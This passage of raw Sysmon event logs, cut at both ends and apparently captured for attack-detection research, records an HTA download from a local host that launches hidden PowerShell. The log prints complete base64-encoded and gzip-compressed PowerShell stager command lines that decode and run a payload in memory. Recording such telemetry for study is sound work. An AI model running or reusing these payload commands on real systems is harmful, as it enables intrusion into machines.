12:20:23.218"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":15,"EventRecordID":1507,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":15,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:23.230170Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Contents":"-","CreationUtcTime":"2021-05-07 12:20:20.107","Hash":"MD5=B1C9F01157759BA9E8679965E51A4AE1,SHA256=CE42A23936E4CEC5E222EC323BC4DBF462FD16E16C21E3C2995F86CF79106C80,IMPHASH=00000000000000000000000000000000","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3086-6095-CB04-000000001D00","ProcessId":3704,"RuleName":"-","TargetFilename":"C:\\Users\\IEUser\\Downloads\\updater.hta","UtcTime":"2021-05-07 12:20:23.219"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":15,"EventRecordID":1508,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":15,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:23.230214Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Contents":"[ZoneTransfer]  ZoneId=3  HostUrl=http://192.168.1.11:6969/updater.hta  ","CreationUtcTime":"2021-05-07 12:20:20.107","Hash":"MD5=C0DA941513B9A6C0E2375D8C16BCEEEE,SHA256=7E97F3C2733B115878BCA160FC2F0569F6A27D64EEBF4F6ADC580A037468EA19,IMPHASH=00000000000000000000000000000000","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessGuid":"747F3D96-3086-6095-CB04-000000001D00","ProcessId":3704,"RuleName":"-","TargetFilename":"C:\\Users\\IEUser\\Downloads\\updater.hta:Zone.Identifier","UtcTime":"2021-05-07 12:20:23.219"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":15,"EventRecordID":1509,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":15,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:23.230316Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\IEUser\\Downloads\\updater.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Microsoft (R) HTML Application host","FileVersion":"11.00.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=4DBAFC3C0B7A9CAA67D6C2C3D99422F2,SHA256=12C94C614FB752DC1F6797B5FB3AD67719E3C924FACDA35DC36792C8E5AC45FC,IMPHASH=4CB8A74361E70A5FF774A0A1A7C65989","Image":"C:\\Windows\\SysWOW64\\mshta.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"MSHTA.EXE","ParentCommandLine":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" ","ParentImage":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ParentProcessGuid":"747F3D96-3057-6095-A504-000000001D00","ParentProcessId":2176,"ProcessGuid":"747F3D96-308A-6095-CD04-000000001D00","ProcessId":2848,"Product":"Internet Explorer","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:20:26.610"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1510,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:26.626652Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBQAGcAaQBsAFcAQQBDAEEANwBWAFcAKwAyACsAYgBTAEIARAArAE8AWgBIAHkAUAA2AEQASwBrAGsARgAxAEQASAA1AGMAbQAwAFMAcQBkAEEAcwAyAE4AbwAxAHgAYwBQAEQAYgB0AGEAbwBOAHIAUABIAFcAQwArAHYAQwBFAHMAZgB0ADkAWAArAC8AdwBZAFkAMABWAFoATwA3ADkAcQBSAEQAZgB1AHgAagBaAG4AYgBtAG0AMgA5AG4AVwBLAFcAUgBKAHkAaQBQAEoATgBFAGoAMAB0AGUAegAwAHgATQBIAHgAegBpAFUANQBGAEoAUQByADAAZwBsAEwAMwBSAEgAcABuAEoAeQBBAHUAcwBsAFAARwA5AGMAUwBPADgAawBlAFkARwAyADIAeABZAFAATQBZADIAVwBWADEAZABHAEcAcwBjAGsARQBzAGQANQB0AFUATQBFAFMAaABJAFMAMwBqAEYASwBFAGwAbQBSAC8AcABJAG0AYQB4AEsAVAA4ADUAdQA3AFQAOABRAFQAMABsAGUAcAA5AEwASABhAFkAZgB3AE8AcwAxAHgAcwBiADIAQgB2AFQAYQBSAHoARgBQAG4AWgBYAG8AOQA3AE8ASABPAG0ANgBtADQAWgBGAFgATAA1AHcANABlAHkAcwBqAGkAdgBMAGEAdgB0AHoAeQBsAG0AaQBWAHgAMgA5ADQAawBnAFkAZABWAG4AcgBLAHgASQAzADUAVABzAHcATwBGACsAUwArAFMAeQBUAGIAMgBZAEoAMwB3AGwAcQBoAE0AYQBOAGUAcgBWAFUAWgBUAGcARgBlAG0ARAB0AFgAdABpAEUANwBIAG0AZgBsAEoAVwBJAEEAcgA0AHgARQBTAGsAYwBTAFEAZAA0AHMAawBNAEgATABmAGwATQBnAHkAZABtAEgAdgBJADkAMgBPAFMASgBPAFcASwB0AE0AaABNAEwANQBiAEwAUAArAFYARgBmAHUANQB0AEcAZwBrAGEAawBxAG8AVgBDAFIATAB6AHIAVQB2AGkAZQArAHEAUgBwAE4AcgBGAGsAYwAvAEkATABWAGsAdABRAGMAcwBWAE0AWQAyAEMAcABhAEsAQQAyAEQAMwBmAEUATABrAFUAcABZAHgAVgBwAE4AOAB4AEkALwBmAEoAcgBrAEQAdABWADUAWABrAHAAMABvAGcANQBZAGgAWQBxAFUAQQBpAG4ANABuAFQANQBuADcASwB5AEYARwB6AC8ASQB5AGoAawBIAHcARgBuAGsAYwBDAEEASABMAGYAegBrADcAUABUAGwAYwBGAFcAVABaADMAMgAvAGIASABwADMAUwBCADAAYwBuAGkATQBDAGIAZwBuAHUAegB3AGgAQgA0AEUAMwAwAGwAYQBSAGIATABoAEkAQwB4ADQAdgBJAGQAcABhAFIAaQBuAFIARgBrACsAZwBpAHUAVgBrAGsAKwBWAGwANwBWAHIAaABTAGcASQBCAHUARgBOAFMAbQBGAHQATQBlAGIAVQBYADQASgBPAG4AdABBAFMAMwA0ACsAdQA2ADkAbgBHAHkAOAB4AHMAawBSAFcATgBTAEcAcwBmADQAWgBCADYAQgBmAG4AawA1ADIAQQBtAEsAMABZAE8AUQBWAFkATABzAFQANgA0AEoAWgBmAHoARABlAEsAMwBDAEMATQBCAEYAaABsAHcAVwBiAFoALwBVAG0AdQBIAFYARAB6AHEANgBpAGwAbABQAG8AbQBSAEIANgBsAEsAdwBDAHYASQBvAHYASwBqAE0AOABkAGMAeQBHAFUAcgBzAGsAawBJAEcAQgAzAG4AUQBMAC8AUwBDAGkAaABQAEMAdQBtAGMANQB2AHYAaQA5AEcAdwBPAFEAbQBXAEQANABTAFMAcABTAEUANABLAGQAOAA2AHIAUwBDADcAQgBqAFAAZwBWAEMAVQBVAEoAegBiAGQAUQBLAHYAaABoAFcAUAA3AHUAcgBwADAAeQBRAFQAMgBjAGkATQBMAGMAVQBuAGsARQBNAGoALwBRADQARgBFAGkANAB0AFMARAB2AEUASAB3AFEAMwBkAEwAUABJAHAAWgBoAGsAVgBGADYAbABLAGYANgBIAHUAWABCAHMAWABCADUAVwBlAFIATQBEAEIAagBjAEIAWABBADAAagAxAGsAQQBsAFkAeQBCAEYAeQBSAHMAUwBFAEcASAB5AEgAegBTAHQAVQBsAHcAZwBxADMAagBJAFEAZwBjAGIAagA3AEoAcwBNAEIAMwBQAFMAYwA3AGcAZgB5ADQASQBEADQANQBaADgAYwBMAFAAaAA4AEoARwArAEcAUgBRAEgAQwBFAC8AYwBnAHcAUwA3AGoAbwBpAEsATgBhAFMAeQBnAGgAbQBTADQASABuAGoAMABYADQANQAvAFUAagB5AE8AagBoAGcAeAB5AFYATQBoAEYAMQBkAGsAbwBlADkARgB4AHUAdABTADcATgBzAFoASgBYAE4AVQBEAGgAagBFAEEAdQBJADMAWQB4ADcAcQBPAEMARgB2AG0AcwBkAEMASQBiADkAUwBiADYAaQBEADQASgBsAFoARQBiAFAAOQA5AHgAdABhAHMAMwBiAHcAdABlAEUANwBzAGwAYwBYAGoAdABCADQAUwBCAHMAVwB0AHoAMABqAGMAVAByAG0AQgBhAEsANwBZAE8AZABkADkASgBIAG4AdgAvAGYASgBwAFQAdAB1AEMAcgBkAHQAQwBjAE4AQgAzAFEASABWADkATwBiAGEAMAA3AFUAaABqAEUAZQBXAG0ARgBtAFcAcwBEAHEAbwBPADEAeAA3AFQASABQAGEAWQBhADkAdgBKAFEALwBxAHIAagB2AEoAYgBCADEAdABlAE0AMQBtAGQANgBxAGgAUgBxAE4ANQAwADkAQQAyAEEATgB5AE0AMQBvAEkATgA4AHYAcwBoADMAVAAzADAAWQBBAHcAVgA4AGEAYQBuAFcANABtAHUAVwBhAHoAOQAzAHIAaQA5AG0AOQBUAE4AKwBZAFIAMQAxAGEAYQA1AFgAawAxADQANAByADYAWgB0AFYAUgBWAHYAZgBSAHgAeQA5ADQAagBwAEgATwAvAFkAZQArAG4AdABWAHMAKwA3AEgAcQBoADMAbwB5ADQAZQBtAGsAMABOADYAaQBOAGsAQgBHADEAeAA2AGIATwByADIAZAA2AGoAQgB4ADEAagBJAE0AdAAzADEAMABIAHUAbABFAFAARABJAFMARwBMAGkAWAB6AHcAYwBqAFUAQgB3AE4AVABSADYAUABPAHAAOAArAHQAUwB6AFYAUQBMAHkAZABUAHYATgBZAG4ANAB6AHEAZABiADYAZQAzAGEANQBpAGIAdQArADcAZwBXAHQAVwBhAGwAawArACsAOABQAGsATwBnAE8AdAB3AGgASQBOAGIAawBBAG0ATQB1AHIAZABlAGcAVQB6AHIATgBkAEoAZgA5ADMAbABTAHgAeAB1AGQASQB4ADEAawB6AFAAbABuADEARgBuAFAAdABxAGIARABZAEgAOAA0AHEAbgBNADAAWgB2ADAAcABSAHIAMwA1ADMAbABUAFYAMgBzAHgAcABvAHEANwBHAEoANQAwAEEARABVAEEAYwBCAC8AbwBBAG8AKwBTACsAOQBhAFcAbAAxAHMAWQArADkAeQBkAC8AOQBHAGMAcgBkAFQAeABsAGIAOQBXAFcATQBYAEQAVwAwAHkAeABtAGQAUgB0AG0AdgA3AHQAdQA2ADkAcQBiADEAMwBiAGUAegBkAHUATAAzAG8AUwBPAFEANAA1AEcAcQBqAHAAKwBsAFgARQBHAFMARgBQADYARQBqADUAaAB3AGsAdAAxADMATQBaAHgAcwBzAFkATQBHAEEASQBGAHUAcgBpAFcASgBvAC8ATgB2AE8AWQA2AG4ARwBZAGEAcwBwAHcAMQA2AGcAMgBKAEkAOABLAGcAegAwAEUAbgBMAEsAaQBOAEcATwBOAGUAVgB2AEcAUAB4AFIAbgBhAHoAYgBFAEoAWgBEADEAcABCAE0ATgBHAC8AZABtAFIASQBqADAASwBLAHQAOQBiAFEAYgBGADAAZABUAFUASABMACsARwB5AEEASgAyAHIAUABSAEkARgBZAGwAMwBSAEgAaABxAGEAQgBtAFYAZABlADIAaABxAEUATwBLAHYAQgAyAGIAdwA3AFYANwBPAEwARgBXAHkAcgBnAEMAdwA1AEgAYgBaAHcAYQA2AFMAWABaADgAUwBzADEAZgAvAEsAMQBqADUAbABWADMARABuAC8AKwB2AFkASAAxAGYAKwA0AGYAZABYAHcASgBRAHEAMgBUAGgALwByAFQANAA0ADgASgB2AGcAZgBtADcAZwBVADgAdwBGAFMARABvAFEAcwBsAGgANQBOAGoAegBYAG8AZwAvADUAOABXAFQAOQB3AEoASQBDAG0AUgA5AGwAVAAvAFoAZQA5ADEATgBLAHMANwA3ADgATABaAHcAZAB2AG8AMwBGAEsAVwBJAFMAMABFAEsAQQBBAEEAPQAnACcAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows PowerShell","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=83767E18DB29B51A804A9E312D0ED99C,SHA256=1EE3D7C80D075D64F97D04D036E558043F2F6BC959C87CD5B0A6D53B96B96A0F,IMPHASH=D1A922C94A1F407CB2BBCAD033C8ED7A","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"PowerShell.EXE","ParentCommandLine":"\"C:\\Windows\\SysWOW64\\mshta.exe\" \"C:\\Users\\IEUser\\Downloads\\updater.hta\" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} ","ParentImage":"C:\\Windows\\SysWOW64\\mshta.exe","ParentProcessGuid":"747F3D96-308A-6095-CD04-000000001D00","ParentProcessId":2848,"ProcessGuid":"747F3D96-308A-6095-CE04-000000001D00","ProcessId":5876,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:20:26.988"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1511,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:27.041612Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:20:27.459","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"747F3D96-308A-6095-CE04-000000001D00","ProcessId":5876,"RuleName":"-","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_1b4ljox5.zpo.ps1","UtcTime":"2021-05-07 12:20:27.459"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1512,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:27.510452Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAPgilWACA7VW+2+bSBD+OZHyP6DKkkF1DH5cm0SqdAs2No1xcPDbtaoNrPHWC+vCEsft9X+/wYY0VZO79qRDfuxjZnbmm29nWKWRJyiPJNEj0tez0xMHxziU5FJQr0glL3RHpnJyAuslPG9cSO8keYG22xYPMY2WV1dGGsckEsd5tUMEShIS3jFKElmR/pImaxKT85u7T8QT0lep9LHaYfwOs1xsb2BvTaRzFPnZXo97OHOm6m4ZFXL5w4eysjivLavtzylmiVx294kgYdVnrKxI35TswOF+S+SyTb2YJ3wlqhMaNerVUZTgFemDtXtiE7HmflJWIAr4xESkcSQd4skMHLflMgydmHvI92OSJOWKtMhML5bLP+VFfu5tGgkakqoVCRLzrUvie+qRpNrFkc/ILVktQcsVMY2CpaKA2D3fELkUpYxVpN8xI/fJrkDtV5Xkp0og5YhYqUAin4nT5n7KyFGz/IyjkHwFnkcCAHLfzk7PTlcFWTZ32/bHp3SB0cniMCbgnuzwhB4E30laRbLhICx4vIdpaRinRFk+giuVkk+Vl7VrhSgIBuFNSmFtMebUX4JOntAS34+u69nGy8xskRWNSGsf4ZB6Bfnk52AmK0YOQVYLsT64JZfzDeK3CCMBFhlwWbZ/UmuHVDzq6illPomRB6lKwCvIovKjM8dcyGUrskkIGB3nQL/SCihPCumc5vvi9GwOQmWD4SSpSE4Kd86rSC7BjPgVCUUJzbdQKvhhWP7urp0yQT2ciMLcUnkEMj/Q4FEi4tSDvEHwQ3dLPIpZhkVF6lKf6HuXBsXB5WeRMDBjcBXA0j1kAlYyBFyRsSEGHyHzStUlwgq3jIQgcbj7JsMB3PSc7gfy4ID45Z8cLPh8JG+GRQHCE/cgwS7joiKNaSyghmS4Hnj0X45/UjyOjhgxyVMhF1dkoe9FxutS7NsZJXNUDhjEAuI3Yx7qOCFvmsdCIb9Sb6iD4JlZEbP99xtas3bwteE7slcXjtB4SBsWtz0jcTrmBaK7YOdd9JHnv/fJpTtuCrdtCcNB3QHV9Oba07UhjEeWmFmWsDqoO1x7THPaYa9vJQ/qrjvJbB1teM1md6qhRqN509A2ANyM1oIN8vsh3T30YAwV8aanW4muWaz93ri9m9TN+YR11aa5Xk144r6ZtVRVvfRxy94jpHO/Ye+ntVs+7Hqh3oy4emk0N6iNkBG1x6bOr2d6jBx1jIMt310HulEPDISGLiXzwcjUBwNTR6POp8+tSzVQLydTvNYn4zqdb6e3a5ibu+7gWtWalk++8PkOgOtwhINbkAmMurdegUzrNdJf93lSxxudIx1kzPln1FnPtqbDYH84qnM0Zv0pRr353lTV2sxpoq7GJ50ADUAcB/oAo+S+9aWl1sY+9yd/9GcrdTxlb9WWMXDW0yxmdRtmv7tu69qb13bezduL3oSOQ45Gqjp+lXEGSFP6Ej5hwkt13MZxssYMGAIFuriWJo/NvOY6nGYaspw16g2JI8Kgz0EnLKiNGONeVvGPxRnazbEJZD1pBMNG/dmRIj0KKt9bQbF0dTUHL+GyAJ2rPRIFYl3RHhqaBmVde2hqEOKvB2bw7V7OLFWyrgCw5HbZwa6SXZ8Ss1f/K1j5lV3Dn/+vYH1f+4fdXwJQq2Th/rT448Jvgfm7gU8wFSDoQslh5NjzXog/58WT9wJICmR9lT/Ze91NKs778LZwdvo3FKWIS0EKAAA='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows PowerShell","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=83767E18DB29B51A804A9E312D0ED99C,SHA256=1EE3D7C80D075D64F97D04D036E558043F2F6BC959C87CD5B0A6D53B96B96A0F,IMPHASH=D1A922C94A1F407CB2BBCAD033C8ED7A","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"PowerShell.EXE","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwAnAEgANABzAEkAQQBQAGcAaQBsAFcAQQBDAEEANwBWAFcAKwAyACsAYgBTAEIARAArAE8AWgBIAHkAUAA2AEQASwBrAGsARgAxAEQASAA1AGMAbQAwAFMAcQBkAEEAcwAyAE4AbwAxAHgAYwBQAEQAYgB0AGEAbwBOAHIAUABIAFcAQwArAHYAQwBFAHMAZgB0ADkAWAArAC8AdwBZAFkAMABWAFoATwA3ADkAcQBSAEQAZgB1AHgAagBaAG4AYgBtAG0AMgA5AG4AVwBLAFcAUgBKAHkAaQBQAEoATgBFAGoAMAB0AGUAegAwAHgATQBIAHgAegBpAFUANQBGAEoAUQByADAAZwBsAEwAMwBSAEgAcABuAEoAeQBBAHUAcwBsAFAARwA5AGMAUwBPADgAawBlAFkARwAyADIAeABZAFAATQBZADIAVwBWADEAZABHAEcAcwBjAGsARQBzAGQANQB0AFUATQBFAFMAaABJAFMAMwBqAEYASwBFAGwAbQBSAC8AcABJAG0AYQB4AEsAVAA4ADUAdQA3AFQAOABRAFQAMABsAGUAcAA5AEwASABhAFkAZgB3AE8AcwAxAHgAcwBiADIAQgB2AFQAYQBSAHoARgBQAG4AWgBYAG8AOQA3AE8ASABPAG0ANgBtADQAWgBGAFgATAA1AHcANABlAHkAcwBqAGkAdgBMAGEAdgB0AHoAeQBsAG0AaQBWAHgAMgA5ADQAawBnAFkAZABWAG4AcgBLAHgASQAzADUAVABzAHcATwBGACsAUwArAFMAeQBUAGIAMgBZAEoAMwB3AGwAcQBoAE0AYQBOAGUAcgBWAFUAWgBUAGcARgBlAG0ARAB0AFgAdABpAEUANwBIAG0AZgBsAEoAVwBJAEEAcgA0AHgARQBTAGsAYwBTAFEAZAA0AHMAawBNAEgATABmAGwATQBnAHkAZABtAEgAdgBJADkAMgBPAFMASgBPAFcASwB0AE0AaABNAEwANQBiAEwAUAArAFYARgBmAHUANQB0AEcAZwBrAGEAawBxAG8AVgBDAFIATAB6AHIAVQB2AGkAZQArAHEAUgBwAE4AcgBGAGsAYwAvAEkATABWAGsAdABRAGMAcwBWAE0AWQAyAEMAcABhAEsAQQAyAEQAMwBmAEUATABrAFUAcABZAHgAVgBwAE4AOAB4AEkALwBmAEoAcgBrAEQAdABWADUAWABrAHAAMABvAGcANQBZAGgAWQBxAFUAQQBpAG4ANABuAFQANQBuADcASwB5AEYARwB6AC8ASQB5AGoAawBIAHcARgBuAGsAYwBDAEEASABMAGYAegBrADcAUABUAGwAYwBGAFcAVABaADMAMgAvAGIASABwADMAUwBCADAAYwBuAGkATQBDAGIAZwBuAHUAegB3AGgAQgA0AEUAMwAwAGwAYQBSAGIATABoAEkAQwB4ADQAdgBJAGQAcABhAFIAaQBuAFIARgBrACsAZwBpAHUAVgBrAGsAKwBWAGwANwBWAHIAaABTAGcASQBCAHUARgBOAFMAbQBGAHQATQBlAGIAVQBYADQASgBPAG4AdABBAFMAMwA0ACsAdQA2ADkAbgBHAHkAOAB4AHMAawBSAFcATgBTAEcAcwBmADQAWgBCADYAQgBmAG4AawA1ADIAQQBtAEsAMABZAE8AUQBWAFkATABzAFQANgA0AEoAWgBmAHoARABlAEsAMwBDAEMATQBCAEYAaABsAHcAVwBiAFoALwBVAG0AdQBIAFYARAB6AHEANgBpAGwAbABQAG8AbQBSAEIANgBsAEsAdwBDAHYASQBvAHYASwBqAE0AOABkAGMAeQBHAFUAcgBzAGsAawBJAEcAQgAzAG4AUQBMAC8AUwBDAGkAaABQAEMAdQBtAGMANQB2AHYAaQA5AEcAdwBPAFEAbQBXAEQANABTAFMAc